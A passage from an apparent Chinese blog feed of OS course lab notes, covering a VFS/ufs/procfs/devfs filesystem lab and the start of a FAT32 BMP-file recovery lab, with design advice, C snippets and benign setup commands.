title="挂载的文件系统"></a>挂载的文件系统</h4><ol><li>ufs<br>ufs是建立在设备sda(磁盘)上的持久数据结构。设备驱动提供了对sda的读写操作。本实验需要支持在ufs中创建目录、文件和链接<br>ufs默认挂载在<strong>/</strong>，即除了<strong>/proc</strong>和<strong>/dev</strong>中的文件和目录之外，其他的文件和目录都属于ufs；注意，如果使用<strong>open</strong>打开<strong>/(ufs)</strong>，并且读取其中的目录项，则应该可以读到<strong>dev</strong>和<strong>proc</strong>两个目录，但他们的inode编号并不重要<br>使用目录管理<strong>/</strong>文件系统的API，可以修改ufs文件系统的结构，并且这些修改会最终被持久化到磁盘上——ufs是磁盘上(sda)设备的文件系统，实验要求将这一数据结构翻译成对I/O设备的读/写操作。注意实验的dev模块已经完成了对磁盘的封装，将磁盘封装成了一个字节序列，可以支持任意位置的读写——这可能会简化变成，但要注意非对齐的读/写会引起额外的I/O操作——例如希望写入磁盘的某个字节，会导致包含该字节的数据块被读取，然后再次被写入。<br>因此该实验系统可以在文件系统中实现一层基于数据块(块大小可以自行决定，例如4KiB)的缓存</li><li>procfs<br><strong>procfs</strong>是虚拟的文件系统，不涉及任何设备。<strong>不支持在procfs中使用vfs API创建文件/目录/链接</strong>。procfs中的目录(/proc本身，以及形如/proc/[id]的目录)需要支持<strong>fstat</strong>和<strong>read</strong>操作，能读出正确的大小(struct ufs_stat中的size字节数)，和struct ufs_dirent结构体<br><strong>procfs</strong>好像是“挂载”在<strong>/proc</strong>下，<strong>procfs</strong>中的目录是所有线程的编号。每个线程对应的目录里至少有一个“name”文件，读取该文件，可以获取现成的名称。<br><strong>proc</strong>的目录和文件会根据线程的创建/删除动态变化。因此要小心如下情况：<ul><li>使用<strong>open</strong>打开<strong>/proc</strong>后，读取到编号为10的进程；</li><li>打开<strong>/proc/10/name</strong>成功;</li><li>此时线程结束退出<br>无论<strong>read</strong>是返回<strong>EOF</strong>，亦或是仍然成功都是合理的；但是操作系统不能因此crash</li></ul></li><li>devfs<br><strong>devfs</strong>是虚拟的文件系统，不涉及任何设备。不支持在<strong>devfs</strong>中使用<strong>vfs API</strong>创建文件/目录/链接<br><strong>devfs</strong>好像是“挂载”在<strong>/dev</strong>下，<strong>devfs</strong>中至少需要包含以下文件：<ul><li><strong>zero(/dev/zero)</strong>：只读，永远返回0的序列</li><li><strong>null(/dev/null)</strong>，读永远返回<strong>EOF</strong>，写数据直接成功(丢弃)</li><li><strong>random(/dev/random)</strong>:只读，返回随机的字节序列<br>同<strong>procfs</strong>，可以使用<strong>vfs</strong>的API打开、读取和写入这些文件</li></ul></li></ol><h4 id="mkfs工具"><a href="#mkfs工具" class="headerlink" title="mkfs工具"></a>mkfs工具</h4><p>你一定留意到<strong>tools/mkfs.c</strong>这个文件了，实验中需要实现该<strong>mkfs</strong>工具，其接受三个参数<strong>size</strong>、<strong>img</strong>和<strong>dir</strong>，将文件系统中的目录<strong>dir</strong>中的所有目录和文件“打包”到<strong>img</strong>镜像文件中，并将镜像文件的大小设置为<strong>size MB</strong>。<br>注意<strong>AbstraceMachine</strong>磁盘镜像有固定的格式<br><img src="AbstractMachine磁盘镜像格式.png" alt="AbstractMachine磁盘镜像格式"></p><p>只有在<strong>kernel</strong>的ELF文件之后的空间才是可用的。为了在磁盘上建立文件系统，有两种可行的方法，可以任意选择:</p><ul><li>文件系统的第一个block从固定的位置开始，例如1MiB的位置</li><li>文件系统的第一个block由ELF文件决定，例如直接在ELF文件之后。需要将该block的编号(例如扇区号)写入到磁盘的引导扇区(第一个512字节)中</li></ul><h4 id="IO坑"><a href="#IO坑" class="headerlink" title="IO坑"></a>IO坑</h4><p>在实现文件系统的过程中，可能会遇到各种各样的小麻烦，例如首先遇到的坑就是<strong>mkfs</strong>需要将文件“pad”到指定的大小，磁盘才能正常写入。如果镜像文件只有1MiB，那么读取之后的文件，都将得到0<br>每个进程都有“当前路径”，通常是文件系统的一个合法目录(至少在<strong>chdir</strong>返回的瞬间，否则<strong>chdir</strong>应该返回失败)。但是，系统中的其他线程(甚至当前线程)可能将这个目录删除。此时，系统的行为是什么？如果再考虑到inode的回收，会发现这件事远比想象地要困难的多。因此，做对所有的<strong>error handling</strong>是个极具挑战的问题，甚至<strong>Linux Kernel</strong>都做得不够好<br>文件系统的API看似简单，但其实随处都充满了各种各样的坑(例如如何进行路径解析、如何将操作转发到对应的文件系统实现等)。因此，要特别留意项目代码的组织和设计，否则很快就会得到一个膨胀且难以维护的代码。</p></blockquote><h2 id="实验标准"><a href="#实验标准" class="headerlink" title="实验标准"></a>实验标准</h2><h3 id="文件系统实现"><a href="#文件系统实现" class="headerlink" title="文件系统实现"></a>文件系统实现</h3><blockquote><p><strong>注意：调试输出</strong><br>同上一个实验，请尽量<strong>不要打印多余的输出</strong>。虽然检查代码会进行一定的过滤，但因为多处理器的并发，在其他处理器上的输出可能会影响检查输出，从而导致Wrong Answer。因此建议使用自己的log或printk函数(而不是printf; 测试程序会使用printf)，且它们的行为由预编译指令控制，仅在本地编译时才打印数据</p></blockquote><p>在这个实验中，会首先使用<strong>mkfs</strong>工具初始化文件系统，然后启动虚拟机、创建若干线程，连续调用文件系统<strong>API</strong>，根据文件系统<strong>API</strong>的输出决定你实现的正确性。执行的操作可能有一定的随机性，并且因为并发程序的不确定性，将会导致每次执行的结果都有一些不同，但你需要实现可串行化<strong>(serializable)</strong>的文件系统：文件系统操作的结果看起来像是所有执行过的文件系统操作排成某个顺序执行的。最简单的实现可串行化的方式就是为文件系统操作加上互斥锁，可以使用信号量的<strong>P/V</strong>操作实现。</p><blockquote><p><strong>注意：上锁的粒度</strong><br>磁盘是慢速设备；一个文件系统的操作可能较长，使用自旋锁可能会导致中断丢失、饥饿等后果(饥饿意味着无法达到最小的性能要求从而Wrong Answer)。如果希望借用Lab2中的同步原语，请使用信号量实现的互斥锁，在线程无法获得锁时睡眠。</p></blockquote><p>所有测试用例的文件系统调用均在使用<strong>kmt-&gt;create</strong>创建的线程中调用——因为文件描述符是线程的一部分，不会在操作系统启动/初始化/中断时执行对文件系统的操作。</p><h3 id="数据的持久性"><a href="#数据的持久性" class="headerlink" title="数据的持久性"></a>数据的持久性</h3><p>在这个实验中，不要求实现满足崩溃一致性的文件系统，也没有提供<strong>fsync</strong>的接口：实验假设操作系统的数据满足“eventual consistency”，即磁盘上的数据结构在没有更多操作到来时，会达到一致的状态。测试数据会在所有的磁盘操作之后等待一秒钟(1000ms)，然后关闭虚拟机。再次重启后，<strong>ufs</strong>文件系统中的数据应当被正确持久化，例如之前创建的目录和文件此时应该能够正确访问，能读取出正确的数据。如果使用了类似<strong>buffer cache</strong>的结构对磁盘的读写进行了缓存，请确保在在进行文件系统调用之后的<strong>1s</strong>内将数据持久化到磁盘。例如：</p><ul><li>可以选择最简单的实现，即每个文件系统操作都立即写入磁盘，在最后一个系统操作返回时，磁盘即处于<strong>consistent</strong>的状态。</li><li>可以构建自己的缓存，有一个后台的<strong>daemon</strong>(类似<strong>jbd</strong>)完成磁盘的写回。建议写回的频率在<strong>500ms</strong>，这样有足够的时间将持久数据写入磁盘(虽然对于实际的系统，写回的频率会更低一些，以减少磁盘的带宽)</li></ul><h2 id="实验指南"><a href="#实验指南" class="headerlink" title="实验指南"></a>实验指南</h2><p>  在开始实现之前，再回顾一下这句话——文件系统是一个磁盘上的数据结构。<br>  因此，就把文件系统当成是一个数据结构问题，用“抽象数据类型”去考虑它的实现即可</p><h3 id="文件系统实现：基础"><a href="#文件系统实现：基础" class="headerlink" title="文件系统实现：基础"></a>文件系统实现：基础</h3><p>  实现文件系统中最“基础”的操作，就是给定一个路径(绝对或相对当前线程的当前路径)，对路径进行解析，然后返回相应的<strong>inode</strong>。道理看起来很简单，但却涉及文件系统的各个部分，也许有些细节就是实现时未考虑到的。</p><p>  首先，<strong>inode</strong>不仅是存储在磁盘上的数据结构(针对ufs而言)，还需要在内存中分配；虚拟的文件系统(例如procfs)还需要维护一些<strong>inode</strong>私有的内存数据(例如procfs)。这里会有多个小问题</p><ol><li>在解析路径时，例如<strong>/this/is/a/very/long/path</strong>时，会经历多个<strong>inode</strong>的访问，例如<strong>/</strong>、<strong>/this</strong>、<strong>/this/is</strong>，…文件系统需要在这些<strong>inode</strong>上分别执行<strong>open</strong>操作，直到确定要打开的<strong>inode</strong>为止；</li><li>线程(进程)有自己的“当前目录”，所有涉及路径的系统调用，当给定的路径不是以<strong>/</strong>开头时，都是相对当前进程的“当前目录”进行解析的</li><li>打开的<strong>inode</strong>会历经各种操作，例如从文件系统中unlink。此时可能有一个进程持有该<strong>inode</strong>的文件描述符，并且正在向文件读写数据</li></ol><p>  只要在内存中实现<strong>struct inode</strong>, 必须小心地管理它的生存周期——当线程创建、销毁、文件关闭……各种时刻，都要小心地维护内存中的<strong>inodes</strong>，使得它们在不再使用时(或者是在可以释放后一段时间后)能被安全地释放，并且不引起double-free, use-after-free等问题。引用计数是个很好的机制，但必须要小心地管理引用——一旦某个引用发生复制时你忘记增加引用计数，就意味着程序里可能会出现严重的问题。</p><p>  路径解析的核心是给定一个<strong>inode</strong>(假设已经载入内存，并且确保是一个目录文件)，然后读取这个目录文件中的目录项(通过文件系统的read操作)，找到名字匹配的<strong>inode</strong>编号，递归这个过程就能完成路径解析——我们也鼓励你实现成递归的，这会大大简化你的实现。</p><p>  路径解析的另一个有趣的问题是处理<strong>/proc</strong>, <strong>/dev</strong>这样的挂载点(mount point)。应该实现一个通用的实现挂载的方案，这样文件系统能挂载到目录树的任何地方——Linux/UNIX的确就是这样实现的。</p><h3 id="多个文件系统的共存"><a href="#多个文件系统的共存" class="headerlink" title="多个文件系统的共存"></a>多个文件系统的共存</h3><p>  在路径解析的过程中，会发现实验中的每个文件系统的“数据结构”都不太一样：</p><ol><li>ufs的文件和目录都以一个类似UNIX文件系统的设计方式存储在磁盘上，因此对ufs文件和目录的修改需要翻译成sda设备上的读写操作；</li><li><strong>procfs</strong>的目录是动态创建的(并且不在持久存储上，而是根据当前的线程)，因此你需要遍历系统中的<strong>struct task</strong>，并且将线程信息写入缓冲区中，然后返回给对<strong>procfs</strong>的read；</li><li><strong>devfs</strong>的每个文件都有一个对应的设备(可能是虚拟的、可能是实际存在的)，对于实际存在的设备，需要调用设备的read/write;而对于虚拟的设备，需要向读者提供正确的数据，或是模拟向设备的写入。</li></ol><p>  实验中需要为每一个文件系统的都实现一套文件/目录的API——这也就是为什么这个实验显得复杂的原因。如果使用紧耦合的方式实现，项目代码很容易会陷入不可维护的泥潭；例如仅仅是写一个“代码框架”就已经在视觉上看起来不太友好了：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vfs_write</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">int</span> count)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span> =</span> current-&gt;oflies[fd]; <span class="comment">// 取出数据结构</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dev</span> *<span class="title">d</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (!f) <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;inode-&gt;type) &#123;</span><br><span class="line">    <span class="keyword">case</span> FS_PROCFS:</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> FS_DEVFS:</span><br><span class="line">      d = getdev(f);</span><br><span class="line">      <span class="keyword">switch</span> (d) &#123;</span><br><span class="line">        <span class="keyword">case</span> DEV_NULL:</span><br><span class="line">          ...</span><br><span class="line">        <span class="keyword">case</span> DEV_RANDOM:</span><br><span class="line">          ...</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="comment">// 其他设备，转发给设备驱动</span></span><br><span class="line">          ...</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> FS_UFS:</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"><span class="built_in">abort</span>:</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因此，在这里有必要做一点“面向对象编程”。不妨把“文件系统”和“文件系统中的文件(包括目录文件)”都以对象的形式包装起来。实际上，整个实验的框架代码其实已经做了很多面向对象的封装了！例如整个操作系统的“模块”就是面向对象的，一个模块就是一个对象。另外一个值得大家参考的是实验对I/O设备进行的封装：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">devops</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> (*init)(<span class="type">device_t</span> *dev);</span><br><span class="line">  <span class="type">ssize_t</span> (*read) (<span class="type">device_t</span> *dev, <span class="type">off_t</span> offset, <span class="type">void</span> *buf, <span class="type">size_t</span> count);</span><br><span class="line">  <span class="type">ssize_t</span> (*write)(<span class="type">device_t</span> *dev, <span class="type">off_t</span> offset, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count);</span><br><span class="line">&#125; <span class="type">devops_t</span>;</span><br></pre></td></tr></table></figure></p><p>  这样之后，就可以进行“面向对象”的调用了:<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d-&gt;ops-&gt;read(d, offset, buf, count) <span class="comment">// d: pointer to struct dev</span></span><br></pre></td></tr></table></figure></p><p>  这样的写法在C++中可以更精简，例如C++的对象自带函数，可以省略“this”的调用。以及C++支持类的继承和虚函数——虚函数就是用类似devops_t实现的！每个对象的头部都有一个称为“vtable”的数据结构，指向了它虚函数实现的地址。<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d.read(offset, buf, count); <span class="comment">// d: reference of a Device object</span></span><br></pre></td></tr></table></figure></p><p>  也可以对文件系统/文件的操作做出类似的封装，可以大幅增加代码的可维护性，在阅读时也更容易梳理实现的正确性。</p><h3 id="文件系统的实现"><a href="#文件系统的实现" class="headerlink" title="文件系统的实现"></a>文件系统的实现</h3><p>  这里有很多微妙的坑(甚至测试用例无法完整地覆盖到它们)。例如，当遍历<strong>procfs</strong>时，需要遍历系统中所有的线程；而与此同时，线程可能被创建/回收。一个复杂系统的实现很容易在这种情况下产生数据竞争(几乎总是bug，例如可能会读取一个尚未初始化好的线程)或是死锁。这样的问题在测试中恰恰是很难暴露的：你很难会想到构造这样的测试用例，以及实际的系统可能会在更 subtle 的情况下出错</p><p>  这里无法完整列举实验中所有可能遇到的坑——但在完成实验的过程中，一定会感叹做好一定的设计是多么重要。以及，无论做了多少设计，在实际中都可能遇到奇奇怪怪的问题，也真正理解了lockdep,AddressSanitizer/ThreadSanitizer这样的工具存在的必要性。总之在这个“编程大实验”会真正体会一些计算机系统设计/实现的困难。Happy hacking!</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>  切换到<strong>master</strong>分支，然后从github上拉去<strong>L3</strong>实验即可<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add jyy https://hub.fastgit.org/NJU-ProjectN/os-workbench.git &amp;&amp; git checkout master &amp;&amp; git pull jyy L3</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面是个人的思路及其实现，<a href="https://gitee.com/jiaweihawk/nju-os/tree/393089f56580e92cbc4ae7a1d6e88c425efcdc40/">实验实现</a></p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-设计与实现-八</title>
      <link href="/2021/12/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E5%85%AB/"/>
      <url>/2021/12/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E5%85%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  本篇博客完成M5的实验</p><h1 id="M5-File-Recovery-frecov"><a href="#M5-File-Recovery-frecov" class="headerlink" title="M5 File Recovery(frecov)"></a>M5 File Recovery(frecov)</h1><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><h3 id="快速格式化"><a href="#快速格式化" class="headerlink" title="快速格式化"></a>快速格式化</h3><p>  大家一定用操作系统提供的“格式化”功能对存储介质进行格式化——通常默认的选项是“快速格式化”；MacOS比较贴心的提供了更多的选项，例如更慢但更安全的选项。</p><p>  实际上，虽然存储设备会比较大，但是格式化起来仍然非常快——如果把存储设备上的文件系统看做是一个数据结构(例如二叉树)，那么只要破坏数据结构的“根节点”，即<code>root-&gt;left = root-&gt;right = NULL;</code>，数据结构的其他部分也就永久地丢失了。这样，数据结构就完成了一次完美的“内存泄漏”。当然，因为整个数据结构都被摧毁，你也可以重置内存分配器的状态，这样所有磁盘上的空间就变得可以被分配，磁盘也就“焕然一新”(被格式化)了。</p><h3 id="格式化磁盘的数据恢复"><a href="#格式化磁盘的数据恢复" class="headerlink" title="格式化磁盘的数据恢复"></a>格式化磁盘的数据恢复</h3><p>  当然，快速格式化紧接着带来了一个问题：快速格式化(指针赋值)也意味着可以通过遍历存储设备(内存)的方式，将数据结构找回来。在本次试验中，就尝试恢复格式化后的<strong>FAT-32</strong>文件系统镜像。</p><p>  实际上，仅是格式化，我们知道文件系统在实现文件/目录的删除操作时，也仅是从文件系统的数据结构中，抹去文件相关的信息，但是并不会实际将每一个保存数据的块删除。这大大增加了文件系统的性能，减少了磁盘的读写数量。这些系统里为了节约时间做出的操作，其实牺牲了一定程度的安全性——可以通过“扫描磁盘”的方式，一定程度地恢复出文件系统中已经被删除的文件。</p><p>  当然，文件恢复是一个非常困难的<strong>open problem</strong>。不过，在本实验中，将进行一定的简化：只需要<strong>best-effort</strong>恢复经过了快速格式化的文件系统中<strong>bmp</strong>格式的<strong>图片</strong>即可。</p><p>  当然，文件恢复也带来了滥用的可能。如从被盗的手机或二手处理手机中恢复隐私数据等。有些系统提供了“文件粉碎”的功能，即向磁盘上所有存储了该文件数据的块写入随机数据的方式避免文件被恢复，但是对于采用了<strong>copy-on-write</strong>方式存储数据的文件系统，甚至是Flash SSD的FTL，其会在硬件上保存有文件的拷贝。此时，使用加密的文件系统更好——将秘钥存储在操作系统都无法访问的数据区，存储文件时将文件数据加密后的密文存储在磁盘上，而读取文件时将磁盘上的密文解密后输出即可</p><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><blockquote><p>实现命令行工具<strong>frecov</strong>，给定一个格式化过的<strong>FAT32</strong>文件系统镜像，假设其中绝大部分文件都是以<strong>BMP</strong>格式存储的。请尽可能地从文件系统中恢复出完整的图片文件。命令行工具使用方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frecov [FILE]</span><br></pre></td></tr></table></figure><br>其中，<strong>FILE</strong>是一个<strong>FAT-32</strong>文件系统的镜像。每恢复一张图片文件(完整的文件，包含BMP头和所有数据)，调用系统中的<strong>sha1sum</strong>命令获得它的校验和，在标准输出中逐行输出图片文件的校验和，以及恢复出的文件名</p><h3 id="图片恢复任务"><a href="#图片恢复任务" class="headerlink" title="图片恢复任务"></a>图片恢复任务</h3><p>这个实验并不是让大家真正编写一个优秀的<strong>undelete</strong>工具。实验的目的是为了让大家体验一下：</p><ul><li>怎样写代码分析文件系统镜像(顺便体会一下<strong>mmap</strong>的方便)；</li><li>怎样写代码分析一个实际的二进制文件：本次实验分析的是<strong>BMP</strong>格式的图片文件</li><li>想一个(也许是非常简单)的算法，恢复出文件系统中的<strong>BMP</strong>文件</li></ul><p>本实验对这个问题做了相当的简化。<br>首先，实验保证文件系统镜像使用如下方法创建的(主要使用<strong>mkfd.fat</strong>工具)：</p><ol><li><p>创建一个空文件(例如在下面的例子中，文件系统镜像的大小是<strong>64MiB</strong>)，例如<strong>fs.img</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /dev/zero | <span class="built_in">head</span> -c $((<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">64</span>)) &gt; fs.img</span><br></pre></td></tr></table></figure></li><li><p>在这个空间文件上创建<strong>FAT-32</strong>文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mkfs.fat -v -F 32 -S 512 -s 8 fs.img</span><br><span class="line">mkfs.fat 4.1 (2017-01-24)</span><br><span class="line">WARNING: Not enough clusters <span class="keyword">for</span> a 32 bit FAT!</span><br><span class="line">fs.img has 64 heads and 32 sectors per track,</span><br><span class="line">hidden sectors 0x0000;</span><br><span class="line">logical sector size is 512,</span><br><span class="line">using 0xf8 media descriptor, with 131072 sectors;</span><br><span class="line">drive number 0x80;</span><br><span class="line">filesystem has 2 32-bit FATs and 8 sectors per cluster.</span><br><span class="line">FAT size is 128 sectors, and provides 16348 clusters.</span><br><span class="line">There are 32 reserved sectors.</span><br><span class="line">Volume ID is 6f71a2db, no volume label.</span><br></pre></td></tr></table></figure><p>注意实验使用的选项： <strong>-S 512</strong>表示<strong>sector</strong>大小是512，<strong>-s 8</strong>表示每个<strong>cluster</strong>有8个<strong>sectors</strong>。可以假设实验总是使用这种方式创建文件系统镜像(即硬编码这个信息)，或者可以写一个兼容<strong>FAT</strong>标准的<strong>frecov</strong></p></li><li><p>挂载新创建的文件系统，并创建根目录下的<strong>DCIM</strong>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mount fs.img /mnt/</span><br><span class="line">$ <span class="built_in">mkdir</span> /mnt/DCIM</span><br></pre></td></tr></table></figure></li><li><p>此时，文件系统已经被挂载到<strong>/mnt</strong>目录下，并且有一个<strong>DCIM</strong>目录。之后，将在<strong>DCIM</strong>目录中进行多次如下操作。尽管图片文件分辨率、大小可能不尽相同，但都<strong>保证是真实世界中有意义的图片</strong>(而不是随机数生成器生成的随机数据):</p><ul><li>向<strong>DCIM</strong>中复制图片文件(文件名为大/小写字母和数字、减号、下划线，以”.bmp”或”.BMP”结尾)</li><li>删除<strong>DCIM</strong>中的图片文件</li><li>…….</li><li>(反复操作之后，文件系统中可能存在一些碎片化的情况)</li></ul></li><li><p>卸载文件系统镜像后，重新进行一次文件系统的快速格式化，通过使用同样的选项再次调用<strong>mkfs.fat</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkfs.fat -v -F 32 -S 512 -s 8 fs.img</span><br></pre></td></tr></table></figure><p>此时的<strong>fs.img</strong>就是要恢复的文件系统镜像。此外，可以假设所有的<strong>BMP</strong>文件，都是使用<strong>PythonPIL</strong>库创建的24-bit位图</p></li></ol><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>试图恢复出<strong>DCIM</strong>目录下尽可能多的图片文件。对于每个恢复出的文件，输出一行，第一个字符串是该文件的<strong>SHA1 fingerprint</strong>(通过调用系统的<strong>sha1sum</strong>命令得到)，然后输出一个或多个空格，接下来输出图片的文件名即可，例如<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d60e7d3d2b47d19418af5b0ba52406b86ec6ef83  0M15CwG1yP32UPCp.bmp</span><br><span class="line">1ab8c4f2e61903ae2a00d0820ea0111fac04d9d3  1yh0sw8n6.bmp</span><br><span class="line">1681e23d7b8bb0b36c399c065514bc04badfde79  2Kbg82NaSqPga.bmp</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="实验标准"><a href="#实验标准" class="headerlink" title="实验标准"></a>实验标准</h2><p>  即按照实验描述中的输出格式输出即可(40字节的sha1sum，之后是文件名)</p><h2 id="实验指南"><a href="#实验指南" class="headerlink" title="实验指南"></a>实验指南</h2><h3 id="FAT32文件系统"><a href="#FAT32文件系统" class="headerlink" title="FAT32文件系统"></a>FAT32文件系统</h3><p>  这里有一份<a href="MSFAT-spec.pdf">Microsoft FAT Specification的文档</a>。</p><p>  根据文档可以知道，<strong>FAT</strong>文件系统是由一些头部信息(元数据)、<strong>FAT</strong>(文件分配表)和数据(cluster，微软的官方翻译是”簇”)组成的。如果尝试做一些分析，很容易知道：</p><ol><li><strong>FAT</strong>文件的头部是可用的——实验使用同样的方式进行两次格式化；</li><li><strong>FAT</strong>表将被清空，此部分的数据相当于全部丢失；</li><li>数据区几乎没有变化——实验执行的是<strong>快速</strong>格式化。</li></ol><p>  接下来，就可以开始照抄手册，进行<strong>FAT</strong>文件系统的解析了，例如手册中已经详细地规定好了<strong>FAT32</strong>文件系统前512个字节的格式，不放将其解释成一个结构体：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fat_header</span> &#123;</span></span><br><span class="line">  u8  BS_jmpBoot[<span class="number">3</span>];</span><br><span class="line">  u8  BS_OEMName[<span class="number">8</span>];</span><br><span class="line">  u32 BPB_BytsPerSec: <span class="number">16</span>;</span><br><span class="line">  u32 BPB_SecPerClus: <span class="number">8</span>;</span><br><span class="line">  ...</span><br><span class="line">  u8  padding[<span class="number">420</span>];</span><br><span class="line">  u16 signature;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure></p><p>  抄手册很容易抄错？不要忘记<code>assert(sizeof(fat_header) == 512)</code>。然后，就可以神奇地发现，如果使用<strong>mmap</strong>系统调用将磁盘映射到地址空间中，例如返回<strong>disk</strong>，那么就可以直接访问磁盘镜像头部的元数据了:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">panic_on(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> fat_header) != <span class="number">512</span>, <span class="string">&quot;bad header&quot;</span>);</span><br><span class="line">panic_on(disk-&gt;signature != <span class="number">0xaa55</span>, <span class="string">&quot;not a valid fat&quot;</span>);</span><br><span class="line">cluster_sz = disk-&gt;BPB_BytsPerSec * disk-&gt;BPB_SecPerClus;</span><br></pre></td></tr></table></figure><p>  这个时候，就可以真正的在内存里任意“把玩”这个数据结构了。做一些实验，看看能不能在文件系统中找到一些有用的数据。</p><blockquote><h4 id="文件系统：存储在磁盘上的数据结构"><a href="#文件系统：存储在磁盘上的数据结构" class="headerlink" title="文件系统：存储在磁盘上的数据结构"></a>文件系统：存储在磁盘上的数据结构</h4><p>读完手册以后，就可以理解——当完成<strong>mmap</strong>以后，其实就可以将文件系统理解成一个数据结构，而<strong>mmap</strong>返回的指针，就是指向<code>struct fat</code>的指针</p></blockquote><p>  这个实验的要求，实际上是在<code>header</code>和<code>clusters</code>完好的前提下，尽可能地恢复出<code>fat</code>中指定的文件</p><h3 id="BMP文件格式"><a href="#BMP文件格式" class="headerlink" title="BMP文件格式"></a>BMP文件格式</h3><p>  为了完成实验，还需要了解<strong>BMP</strong>文件的格式。这里为了锻炼独立思考、查找资料的能力，关于<strong>BMP</strong>文件的细节，请<strong>STFW</strong>。</p><p>  好消息是这部分需要查阅的资料很简单，由于实验的<strong>BMP</strong>都是以相同的方式创建的，因此可以忽略其中大部分的<strong>fields</strong>，只需要关注：</p><ol><li>bitmap存储区域开始的offset</li><li>图片的宽度和高度</li></ol><h3 id="扫描Clusters"><a href="#扫描Clusters" class="headerlink" title="扫描Clusters"></a>扫描Clusters</h3><p>  